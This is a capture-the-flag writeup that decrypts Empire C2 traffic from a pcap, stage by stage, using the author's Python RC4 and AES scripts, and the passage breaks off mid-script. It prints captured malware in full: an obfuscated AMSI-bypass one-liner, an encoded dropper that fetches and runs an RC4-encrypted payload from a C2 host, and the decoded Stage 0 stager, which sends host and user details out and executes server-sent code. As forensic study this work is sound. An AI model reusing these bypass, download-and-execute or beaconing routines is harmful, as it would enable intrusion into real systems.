+++
title = "Empire is at Risk - Writeup"
draft = false
ShowToc = true
tags = ["empire c2"]
categories = ["c2","Malware"]
author = ["connar"]
+++

# Intro
In this challenge we are given:
<blockquote>
    <p>A pcap file (capture.pcap)</p>
    <p>A powershell dump (powershell.DMP)</p>
</blockquote>

A lot of times hard difficulty challenges are related to C2 traffic, and in this challenge we are given a pcap file that indicates there is a chance this might be the case. Simply searching for `Empire C2` (Empire from the title of the challenge) will yield results related to an Empire C2 Framework.  

# Reference material to solve the challenge
Navigating through some posts, a very good one that I used as a reference while solving the challenge was:
- `https://www.keysight.com/blogs/en/tech/nwvs/2021/06/16/empire-c2-networking-into-the-dark-side`

This post showcases how to decrypt traffic step by step and the similarities between this post and the challenge are plenty, which helped me a ton in the proccess of following it step by step. Quoted from the post:  

```
STAGE 0 - First, the victim sends a GET beacon with a cookie in the HTTP headers, server replies with 200 OK with a big (~ 5.5 KB) encrypted payload.
STAGE 1 - The victim sends a POST message with an encrypted payload, to which server sends a 200 OK response with a small payload.
STAGE 2 - Finally, the victim sends another POST message, to which server replies with an even bigger (~ 41KB) payload.
```

I will show how to proceed to each step and gather all the required info to decrypt the traffic.

# Getting the RC4 key
Before we head to STAGE 0, we need to find the dropper. Navigating through the first TCP streams, we will end up finding the following packet:  
```

PS C:\Windows\system32> whoami
corp\satadministrator
PS C:\Windows\system32> $MFmONzmHg=$null;$rfsbs="$(('S'+'y'+'s'+'t'+'e'+'m').nORMALIZe([ChAR](70*52/52)+[CHAr](66+45)+[cHar]([byTe]0x72)+[chAr]([byte]0x6d)+[chAr](68*21/21)) -replace [CHaR](92*74/74)+[ChaR](112)+[chAR](123)+[cHaR](25+52)+[ChaR]([bYtE]0x6e)+[CHaR](18+107)).$([CHaR]([bYte]0x4d)+[chAr]([ByTe]0x61)+[cHAR]([ByTe]0x6e)+[cHaR](97)+[ChAr](103*89/89)+[CHar]([bytE]0x65)+[ChaR](17+92)+[cHaR]([BytE]0x65)+[char](51+59)+[cHaR](116+63-63)).$(('..ut..m'+'..t....n').noRMAlIZE([cHar](17+53)+[chAr](111+5-5)+[ChaR](114+20-20)+[ChAR](109)+[CHar]([BYTe]0x44)) -replace [chaR]([bYtE]0x5c)+[cHAr](28+84)+[CHAr](123*58/58)+[CHar](77)+[char](55+55)+[ChAr](125+34-34)).$([ChAR](30+35)+[char](109+82-82)+[chaR]([ByTE]0x73)+[ChAr]([BYte]0x69)+[char]([BYTE]0x55)+[cHar](116+28-28)+[cHar](105)+[chaR](108)+[Char]([Byte]0x73))";$hn="+[cHAr]([ByTE]0x6d)+[cHaR]([BYtE]0x73)";[Threading.Thread]::Sleep(1801);[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType($([chAr]([BYTE]0x53)+[chAR](121*1/1)+[CHAr]([byte]0x73)+[char]([bYtE]0x74)+[cHaR]([BytE]0x65)+[ChaR](109+98-98)+[cHAR](46*36/36)+[CHAR](82)+[cHar](61+40)+[ChAr](102*7/7)+[cHAR](108+8-8)+[CHaR]([bYte]0x65)+[char]([ByTE]0x63)+[cHAR]([ByTE]0x74)+[ChAr](105)+[cHAR]([byTe]0x6f)+[chAr]([bytE]0x6e)+[CHaR](46*5/5)+[cHar]([bYte]0x42)+[CHar](105+78-78)+[ChAr]([BytE]0x6e)+[chAR]([BYTe]0x64)+[CHAR](31+74)+[cHaR](22+88)+[chAr]([BytE]0x67)+[cHAR]([BYtE]0x46)+[cHaR](108*18/18)+[ChAR]([byte]0x61)+[cHar]([BYTe]0x67)+[ChAR]([BytE]0x73)))).FullName), $(('S'+'y'+'s'+'t'+'e'+'m').nORMALIZe([ChAR](70*52/52)+[CHAr](66+45)+[cHar]([byTe]0x72)+[chAr]([byte]0x6d)+[chAr](68*21/21)) -replace [CHaR](92*74/74)+[ChaR](112)+[chAR](123)+[cHaR](25+52)+[ChaR]([bYtE]0x6e)+[CHaR](18+107)).Reflection.FieldInfo]" -as [String].Assembly.GetType($([CHAR]([BYtE]0x53)+[ChAr]([BYTE]0x79)+[cHAR]([BYte]0x73)+[ChAr]([BYTE]0x74)+[CHaR](101+5-5)+[ChaR]([BYTe]0x6d)+[ChAR](46)+[Char]([bYTe]0x54)+[Char]([byTe]0x79)+[chAR](12+100)+[char](101+27-27)))), [Object]([Ref].Assembly.GetType($rfsbs)),($(('GetF..'+'eld').NOrMaLize([chaR](70)+[char]([byTe]0x6f)+[CHAR]([bYtE]0x72)+[CHAr](109)+[CHar]([BYtE]0x44)) -replace [CHAr](92+15-15)+[ChAR]([bYTe]0x70)+[CHAR](123*12/12)+[chAr]([bYTE]0x4d)+[cHar]([bYTE]0x6e)+[ChaR](125+14-14)))).Invoke($([ChAr]([ByTE]0x61)+[CHAr]([BYTe]0x6d)+[chAr](101+14)+[ChaR]([bytE]0x69)+[CHaR]([BYte]0x49)+[char](110+17-17)+[CHaR](105)+[CHAR]([bytE]0x74)+[chAr]([byte]0x46)+[chaR]([byTE]0x61)+[Char]([BytE]0x69)+[chAr](108)+[chAr]([BYTe]0x65)+[chAr]([BYtE]0x64)),(("NonPublic,Static") -as [String].Assembly.GetType($([chAr]([BYTE]0x53)+[chAR](121*1/1)+[CHAr]([byte]0x73)+[char]([bYtE]0x74)+[cHaR]([BytE]0x65)+[ChaR](109+98-98)+[cHAR](46*36/36)+[CHAR](82)+[cHar](61+40)+[ChAr](102*7/7)+[cHAR](108+8-8)+[CHaR]([bYte]0x65)+[char]([ByTE]0x63)+[cHAR]([ByTE]0x74)+[ChAr](105)+[cHAR]([byTe]0x6f)+[chAr]([bytE]0x6e)+[CHaR](46*5/5)+[cHar]([bYte]0x42)+[CHar](105+78-78)+[ChAr]([BytE]0x6e)+[chAR]([BYTe]0x64)+[CHAR](31+74)+[cHaR](22+88)+[chAr]([BytE]0x67)+[cHAR]([BYtE]0x46)+[cHaR](108*18/18)+[ChAR]([byte]0x61)+[cHar]([BYTe]0x67)+[ChAR]([BytE]0x73))))).SetValue($MFmONzmHg,$True);
PS C:\Windows\system32> powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQAzAEEARABjAEEATABnAEEAMwBBAEQAUQBBAEwAZwBBAHgAQQBEAGsAQQBPAEEAQQB1AEEARABVAEEATQBnAEEANgBBAEQAZwBBAE0AQQBBADQAQQBEAE0AQQAnACkAKQApADsAJAB0AD0AJwAvAG4AZQB3AHMALgBwAGgAcAAnADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAB3AGMALgBQAHIAbwB4AHkAPQBbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEQAZQBmAGEAdQBsAHQAVwBlAGIAUAByAG8AeAB5ADsAJAB3AGMALgBQAHIAbwB4AHkALgBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AQwByAGUAZABlAG4AdABpAGEAbABDAGEAYwBoAGUAXQA6ADoARABlAGYAYQB1AGwAdABOAGUAdAB3AG8AcgBrAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAB3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAHkAdABlAHMAKAAnAGUAdwB0AFYAWgBpAE4AfgA1ACkAMQAzAEMAeAAuAE0AQABvAE8ASgB5AHAAXgBHAD4AVABSAFcAcQAoACMAYgAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AG4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAHgAbwByACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIAUgBZAGIAZgBIAEEAPQBQAG0ATABzAG0AYwBSAGUAKwBRAC8AZwB6AEwAUQBiAEoAbQBOAG8ANgBxAEIARgBlAFgAZwA9ACIAKQA7ACQAZABhAHQAYQA9ACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAkAHMAZQByACsAJAB0ACkAOwAkAGkAdgA9ACQAZABhAHQAYQBbADAALgAuADMAXQA7ACQAZABhAHQAYQA9ACQAZABhAHQAYQBbADQALgAuACQAZABhAHQAYQAuAGwAZQBuAGcAdABoAF0AOwAtAGoAbwBpAG4AWwBDAGgAYQByAFsAXQBdACgAJgAgACQAUgAgACQAZABhAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA
```

Decoding the second b64 data that are going to be executed as powershell code, we get our dropper:
```powershell
If ($PSVersionTable.PSVersion.Major  - ge 3)  {};
[System.Net.ServicePointManager]::Expect100Continue = 0;
$wc = New - Object System.Net.WebClient;
$u = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';
$ser = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwA3ADcALgA3ADQALgAxADkAOAAuADUAMgA6ADgAMAA4ADMA')));
$t = '/news.php';
$wc.Headers.Add('User-Agent', $u);
$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
$Script:Proxy = $wc.Proxy;
$K = [System.Text.Encoding]::ASCII.GetBytes('ewtVZiN~5)13Cx.M@oOJyp^G>TRWq(#b');
$R = {
    $D, $K = $Args;
    $S = 0..255;
    0..255|% {
        $J = ($J + $S[$_] + $K[$_%$K.Count])%256;
        $S[$_], $S[$J] = $S[$J], $S[$_]
    };
    $D|% {
        $I = ($I + 1)%256;
        $H = ($H + $S[$I])%256;
        $S[$I], $S[$H] = $S[$H], $S[$I];
        $_ - bxor$S[($S[$I] + $S[$H])%256]
    }

};
$wc.Headers.Add("Cookie", "RYbfHA=PmLsmcRe+Q/gzLQbJmNo6qBFeXg=");
$data = $wc.DownloadData($ser + $t);
$iv = $data[0..3];
$data = $data[4..$data.length];
 - join[Char[]](& $R $data ($IV + $K))|IEX
```

This basically downloads the STAGE 0 from the ip:port hidden inside this base64 blob: `aAB0AHQAcAA6AC8ALwA3ADcALgA3ADQALgAxADkAOAAuADUAMgA6ADgAMAA4ADMA`.

The RC4 key it uses is: `ewtVZiN~5)13Cx.M@oOJyp^G>TRWq(#b`.
It also sets a cookie encrypted with the same RC4 key: `PmLsmcRe+Q/gzLQbJmNo6qBFeXg=`. Before we proceed to decrypt our STAGE 0 payload, let's try to decrypt the cookie as the blog suggests (to make sure we have the correct key and way of decryption). Based on the blog, I made the following python script:  
```py
from Crypto.Cipher import ARC4
from base64 import b64decode


key = b'ewtVZiN~5)13Cx.M@oOJyp^G>TRWq(#b'
enc_data = b'PmLsmcRe+Q/gzLQbJmNo6qBFeXg='

encr_data = b64decode(enc_data)
cipher = ARC4.new(encr_data[0:4] + key)

msg = cipher.decrypt(encr_data[4:19])
print(msg)
```
Running it, we get:
```sh
└─$ python rc4_decrypt.py
b'00000000\x01\x01\x00\x00\x00\x00\x00'
```
which is the same as what the blog showcases, so we are in the right track! Basically, based on the blog:
```
+-----------+--------+--------+---------+---------+
| SessionID | Lang   | Meta   | Extra   | Length  |
+-----------|--------|--------|---------|---------|
| 8 bytes   | 1 byte | 1 byte | 2 bytes | 4 bytes |
+-----------|--------|--------|---------|-------- |
| 00000000  | 01     | 01     | 0000    | 0000    |
+-----------|--------|--------|---------|---------|
```

# Stage 0

Great, now let's head to the response of the `GET /news.php` which contains the encrypted STAGE 0 code.  
```
GET /news.php HTTP/1.1
Cookie: RYbfHA=PmLsmcRe+Q/gzLQbJmNo6qBFeXg=
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
Host: 77.74.198.52:8083
Connection: Keep-Alive

HTTP/1.1 200 OK
Server: Werkzeug/2.1.2 Python/3.9.13
Date: Tue, 30 Aug 2022 16:35:50 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 7409
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Expires: 0
Server: Microsoft-IIS/7.5
Connection: close

.).J<...%o...o(]......J.......[
y.O.^..6...........y.m...A...P.^J...bp:.
... ...
%...........f.7......=.O...H0;..0A.B.w.......N.r..[]l..b-.].W...........Y>2Z......
2..V....!.....CN&ZF.e......[L").&.....m.....=.:....R.OKJx..=Y.....-.
Y...2.6cA.=....A...IC`.LUo..3.I\........`......U.......p
---more data---
```

We will modify our script to the following one for decryption:  
```py
from Crypto.Cipher import ARC4
from base64 import b64decode


key = b'ewtVZiN~5)13Cx.M@oOJyp^G>TRWq(#b'
# If we choose "Show data as Raw" in Wireshark, we will get the following hex data stored in enc_data
enc_data = "1a29d64a3cb4ebaf...[more hex]"

encr_data = bytes.fromhex(enc_data)
cipher = ARC4.new(encr_data[0:4] + key)

msg = cipher.decrypt(encr_data[4:])
print(msg)
```
After running it, we get the decrypted STAGE 0 powershell code:
```ps1
$server = "http://77.74.198.52:8083";
$Script:ControlServers = @($server);
$Script:ServerIndex = 0;
if ($server.StartsWith(\'https\'))  {
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {
        $true
    };
}

$Script:SendMessage = {
    param($Packets)if ($Packets)  {
        $EncBytes = Encrypt - Bytes $Packets;
        $RoutingPacket = New - RoutingPacket  - EncData $EncBytes  - Meta 5;
        if ($Script:ControlServers[$Script:ServerIndex].StartsWith(\'http\'))  {
            $wc = New - Object System.Net.WebClient;
            $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
            $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
            if ($Script:Proxy)  {
                $wc.Proxy = $Script:Proxy;
            }

            $wc.Headers.Add(\'User - Agent\', $Script:UserAgent);
            $Script:Headers.GetEnumerator() | ForEach - Object {
                $wc.Headers.Add($_.Name, $_.Value)
            };
            try {
                $taskURI = $Script:TaskURIs | Get - Random;
                $response = $wc.UploadData($Script:ControlServers[$Script:ServerIndex] + $taskURI, \'POST\', $RoutingPacket);
            } catch [System.Net.WebException] {
                if ($_.Exception.GetBaseException().Response.statuscode  - eq 401)  {
                    Start - Negotiate  - S "$ser"  - SK $SK  - UA $ua;
                }

            }

        }

    }

};
$Script:GetTask = {
    try {
        if ($Script:ControlServers[$Script:ServerIndex].StartsWith("http"))  {
            $RoutingPacket = New - RoutingPacket  - EncData $Null  - Meta 4;
            $RoutingCookie = [Convert]::ToBase64String($RoutingPacket);
            $wc = New - Object System.Net.WebClient;
            $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
            $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
            if ($Script:Proxy)  {
                $wc.Proxy = $Script:Proxy;
            }

            $wc.Headers.Add("User-Agent", $script:UserAgent);
            $script:Headers.GetEnumerator() | % {
                $wc.Headers.Add($_.Name, $_.Value)
            };
            $wc.Headers.Add("Cookie", "session=$RoutingCookie");
            $taskURI = $script:TaskURIs | Get - Random;
            $result = $wc.DownloadData($Script:ControlServers[$Script:ServerIndex]  +  $taskURI);
            $result;
        }

    } catch [Net.WebException] {
        $script:MissedCheckins += 1;
        if ($_.Exception.GetBaseException().Response.statuscode  - eq 401)  {
            Start - Negotiate  - S "$ser"  - SK $SK  - UA $ua;
        }

    }

};
function Start - Negotiate {
    param($s, $SK, $UA = \'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0;
    rv:11.0) like Gecko\', $hop)function ConvertTo - RC4ByteStream {
        Param ($RCK, $In)begin {
            [Byte[]] $Str = 0..255;
            $J = 0;
            0..255 | ForEach - Object {
                $J = ($J  +  $Str[$_]  +  $RCK[$_ % $RCK.Length]) % 256;
                $Str[$_], $Str[$J] = $Str[$J], $Str[$_];
            };
            $I = $J = 0;
        }

        process {
            ForEach($Byte in $In) {
                $I = ($I  +  1) % 256;
                $J = ($J  +  $Str[$I]) % 256;
                $Str[$I], $Str[$J] = $Str[$J], $Str[$I];
                $Byte  - bxor $Str[($Str[$I]  +  $Str[$J]) % 256];
            }

        }

    }

    function Decrypt - Bytes {
        param ($Key, $In)if ($In.Length  - gt 32)  {
            $HMAC = New - Object System.Security.Cryptography.HMACSHA256;
            $e = [System.Text.Encoding]::ASCII;
            $Mac = $In[ - 10.. - 1];
            $In = $In[0..($In.length  -  11)];
            $hmac.Key = $e.GetBytes($Key);
            $Expected = $hmac.ComputeHash($In)[0..9];
            if (@(Compare - Object $Mac $Expected  - Sync 0).Length  - ne 0)  {
                return;
            }

            $IV = $In[0..15];
            try {
                $AES = New - Object System.Security.Cryptography.AesCryptoServiceProvider;
            } catch {
                $AES = New - Object System.Security.Cryptography.RijndaelManaged;
            }

            $AES.Mode = "CBC";
            $AES.Key = $e.GetBytes($Key);
            $AES.IV = $IV;
            ($AES.CreateDecryptor()).TransformFinalBlock(($In[16..$In.length]), 0, $In.Length - 16)
        }

    }

    $Null = [Reflection.Assembly]::LoadWithPartialName("System.Security");
    $Null = [Reflection.Assembly]::LoadWithPartialName("System.Core");
    $ErrorActionPreference = "SilentlyContinue";
    $e = [System.Text.Encoding]::UTF8;
    $customHeaders = "";
    $SKB = $e.GetBytes($SK);
    try {
        $AES = New - Object System.Security.Cryptography.AesCryptoServiceProvider;
    } catch {
        $AES = New - Object System.Security.Cryptography.RijndaelManaged;
    }

    $IV = [byte] 0..255 | Get - Random  - count 16;
    $AES.Mode = "CBC";
    $AES.Key = $SKB;
    $AES.IV = $IV;
    $hmac = New - Object System.Security.Cryptography.HMACSHA256;
    $hmac.Key = $SKB;
    $csp = New - Object System.Security.Cryptography.CspParameters;
    $csp.Flags = $csp.Flags  - bor [System.Security.Cryptography.CspProviderFlags]::UseMachineKeyStore;
    $rs = New - Object System.Security.Cryptography.RSACryptoServiceProvider  - ArgumentList 2048, $csp;
    $rk = $rs.ToXmlString($False);
    $ID =  - join("ABCDEFGHKLMNPRSTUVWXYZ123456789".ToCharArray()|Get - Random  - Count 8);
    $ib = $e.getbytes($rk);
    $eb = $IV + $AES.CreateEncryptor().TransformFinalBlock($ib, 0, $ib.Length);
    $eb = $eb + $hmac.ComputeHash($eb)[0..9];
    if ( - not $wc)  {
        $wc = New - Object System.Net.WebClient;
        $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
        $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
    }

    if ($Script:Proxy)  {
        $wc.Proxy = $Script:Proxy;
    }

    if ($customHeaders  - ne "")  {
        $headers = $customHeaders  - split \', \';
        $headers | ForEach - Object {
            $headerKey = $_.split(\':\')[0];
            $headerValue = $_.split(\':\')[1];
            if ($headerKey  - eq "host")  {
                try {
                    $ig = $WC.DownloadData($s)
                } catch {}

            };
            $wc.Headers.Add($headerKey, $headerValue);
        }

    }

    $wc.Headers.Add("User-Agent", $UA);
    $IV = [BitConverter]::GetBytes($(Get - Random));
    $data = $e.getbytes($ID)  +  @(0x01, 0x02, 0x00, 0x00)  +  [BitConverter]::GetBytes($eb.Length);
    $rc4p = ConvertTo - RC4ByteStream  - RCK $($IV + $SKB)  - In $data;
    $rc4p = $IV  +  $rc4p  +  $eb;
    $raw = $wc.UploadData($s + "/login/process.php", "POST", $rc4p);
    $de = $e.GetString($rs.decrypt($raw, $false));
    $nonce = $de[0..15]  - join \'\';
    $key = $de[16..$de.length]  - join \'\';
    $nonce = [String]([long]$nonce  +  1);
    try {
        $AES = New - Object System.Security.Cryptography.AesCryptoServiceProvider;
    } catch {
        $AES = New - Object System.Security.Cryptography.RijndaelManaged;
    }

    $IV = [byte] 0..255 | Get - Random  - Count 16;
    $AES.Mode = "CBC";
    $AES.Key = $e.GetBytes($key);
    $AES.IV = $IV;
    $i = $nonce + \'|\' + $s + \'|\' + [Environment]::UserDomainName + \'|\' + [Environment]::UserName + \'|\' + [Environment]::MachineName;
    try {
        $p = (gwmi Win32_NetworkAdapterConfiguration|Where {
            $_.IPAddress
        }

        |Select  - Expand IPAddress);
    } catch {
        $p = "[FAILED]"
    }

    $ip = @ {
        $true = $p[0];
        $false = $p
    }

    [$p.Length  - lt 6];
    if (!$ip  - or $ip.trim()  - eq \'\')  {
        $ip = \'0.0.0.0\'
    };
    $i += "|$ip";
    try {
        $i += \'|\' + (Get - WmiObject Win32_OperatingSystem).Name.split(\'|\')[0];
    } catch {
        $i += \'|\' + \'[FAILED]\'
    }

    if (([Environment]::UserName).ToLower()  - eq "system")  {
        $i += "|True"
    } else {
        $i += \'|\'  + ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
    }

    $n = [System.Diagnostics.Process]::GetCurrentProcess();
    $i += \'|\' + $n.ProcessName + \'|\' + $n.Id;
    $i += "|powershell|"  +  $PSVersionTable.PSVersion.Major;
    $i += "|"  +  $env:PROCESSOR_ARCHITECTURE;
    $ib2 = $e.getbytes($i);
    $eb2 = $IV + $AES.CreateEncryptor().TransformFinalBlock($ib2, 0, $ib2.Length);
    $hmac.Key = $e.GetBytes($key);
    $eb2 = $eb2 + $hmac.ComputeHash($eb2)[0..9];
    $IV2 = [BitConverter]::GetBytes($(Get - Random));
    $data2 = $e.getbytes($ID)  +  @(0x01, 0x03, 0x00, 0x00)  +  [BitConverter]::GetBytes($eb2.Length);
    $rc4p2 = ConvertTo - RC4ByteStream  - RCK $($IV2 + $SKB)  - In $data2;
    $rc4p2 = $IV2  +  $rc4p2  +  $eb2;
    if ($customHeaders  - ne "")  {
        $headers = $customHeaders  - split \', \';
        $headers | ForEach - Object {
            $headerKey = $_.split(\':\')[0];
            $headerValue = $_.split(\':\')[1];
            if ($headerKey  - eq "host")  {
                try {
                    $ig = $WC.DownloadData($s)
                } catch {}

            };
            $wc.Headers.Add($headerKey, $headerValue);
        }

    }

    $wc.Headers.Add("User-Agent", $UA);
    $wc.Headers.Add("Hop-Name", $hop);
    $raw = $wc.UploadData($s + "/admin/get.php", "POST", $rc4p2);
    IEX $( $e.GetString($(Decrypt - Bytes  - Key $key  - In $raw)) );
    $AES = $null;
    $s2 = $null;
    $wc = $null;
    $eb2 = $null;
    $raw = $null;
    $IV = $null;
    $wc = $null;
    $i = $null;
    $ib2 = $null;
    [GC]::Collect();
    LRFT7  - Servers @(($s  - split "/")[0..2]  - join "/")  - StagingKey $SK  - SessionKey $key  - SessionID $ID  - WorkingHours ""  - KillDate ""  - ProxySettings $Script:Proxy;
}

Start - Negotiate  - s "$ser"  - SK \'ewtVZiN~5)13Cx.M@oOJyp^G > TRWq(#b\'  - UA $u  - hop "$hop";
```

# Stage 1

Continuing with the next pair of HTTP request-response, we are met with the following packet:
```
POST /login/process.php HTTP/1.1
Cookie: RYbfHA=PmLsmcRe+Q/gzLQbJmNo6qBFeXg=
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
Host: 77.74.198.52:8083
Content-Length: 462

......<T.L.....W'......%F..S$a}!.h.dX...V..;
:7~.......80..C...HU.^.V....b.=dj
Dj.....x..s.......x8"..U.......J..E*....5H......sG'>#..O.V.8F.}b.wt.:..=U.
....@
%.-.V.....l.......R...R.P%....</%8...H.f,..5.-.t.W*p..*...k.g.3..B..eX1O}....3.....!J.^l..S.I.a......Am.....DU+....8.......v.()a.ihv...........wd..{.:&./T...xY_.H.w.O..@N..]v...M....'..|..j9.....?n..G..r.)...BN..Pp\1!k.].#.....c%.2........aTOt.`}...Z........W..)....!.E.G...+.(...r...6........k..^h@B.!HTTP/1.1 200 OK
Server: Werkzeug/2.1.2 Python/3.9.13
Date: Tue, 30 Aug 2022 16:35:51 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 256
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Expires: 0
Server: Microsoft-IIS/7.5
Connection: close

{.0c...R~..`.^...W./............T2.k..fZAIH.......!.6.+..$)..>.`E.......OC...C.=.. s....k1+.%.h....g...aD.d}....U.....
...Ykf..nTfW.g..EzR....
...:V....}K.}y.NhE.v..r....0..C..H..sP.9.Vo..i.b|.S.....?.s&.BXv3..._P........^8..h...32./.Xd..*.....{.~..7.c.+..
```

Based on the articles instructions, we update our script to decrypt the first [4:19] bytes to see at what stage we are now:
```py
from Crypto.Cipher import ARC4

key = b'ewtVZiN~5)13Cx.M@oOJyp^G>TRWq(#b'
enc_data = "8e15a81b0cb93c54dd4cbf8cf105cd5727b1d0c7af9c952546a5c05324617d21d468b464582ed8f156fbeb3b0d3a377e1416aeb21d8c013830141e4383f4bf4855ba5eb156f0aeefda62883d646a0a446a16bc94ddd7780cca739cc5c28dd7caf3783822060555c4f0d0f5e0f9044ad2ce452addde11c335489611c588f0e47347273e23e29d4fd956fd3846b57d62027774b33a9d963d55e00dcc018f95400d25852db856f0be9bf3816c94ea12ab9aa8db5217e20352995025b81dbaa23c2f253804bdcd48e4662cd5f035112de674d2572a70958c2a96c1a06bd767b933841d4204dd6558314f7ded14fb9633919afaf1fa214ac95e6ccfa053b749fc61be80c8e2e2bc416dc5c6af88fa44552b12a3f6e138c10cbccaacc5df76eb282961b2696876b312c6bff0da82e81c9694776481a47b923a26e62f5486e09878595ff7480677124fedd7404e9fb15d769cacc64dfbbbb1c527e6ef7ce1166a39ffc015ec9a3f6e88ed47e30e729f290787fa424ef98c50705c31216b9e5d9723a11eeeccc76325ce32b1b5f6b5fb1deb1861544f7484607d2ecdf25abad79d1900d8cab257e1b7290ce5dbc7211d45c547c3f0972ba228daddd6728aba0b36a70bdbc2cd95a3f56b2efd5e684042a721"

encr_data = bytes.fromhex(enc_data)

cipher = ARC4.new(encr_data[0:4] + key)
msg = cipher.decrypt(encr_data[4:19])
print("[+] RC4 Decrypted:", msg)
```
And we get the following: `[+] RC4 Decrypted: b'EBXWPAHZ\x01\x02\x00\x00\xba\x01\x00'`.  
Notice that the third column has changed from `01` to `02` indicating we are now in stage 1. The `\xba\x01` indicates how many bytes has to still be decrypted (after the first 20 bytes we just decrypted) to successfully decrypt the rest of the payload.  

## Stage 1 - AES decryption to get RSA PubKey
The twist here is that Empire C2 based on the article, in stage 2, uses AES decryption to decrypt the rest of the `\xba\x01` bytes. This can also be assumed from the decrypted STAGE 0 payload that contained powershell code performing `AES CBC` decryption.  

Based on this information, we update our script to handle the remaining bytes:  
```python
from Crypto.Cipher import  AES
from Crypto.Util.Padding import pad, unpad

def aes_decrypt(ciphertext, key):
    ciphertext = pad(ciphertext, AES.block_size)
    iv = ciphertext[:16]
    cipher = AES.new(key, AES.MODE_CBC, iv)

    plaintext = cipher.decrypt(ciphertext[16:])

    return plaintext

key = b'ewtVZiN~5)13Cx.M@oOJyp^G>TRWq(#b'
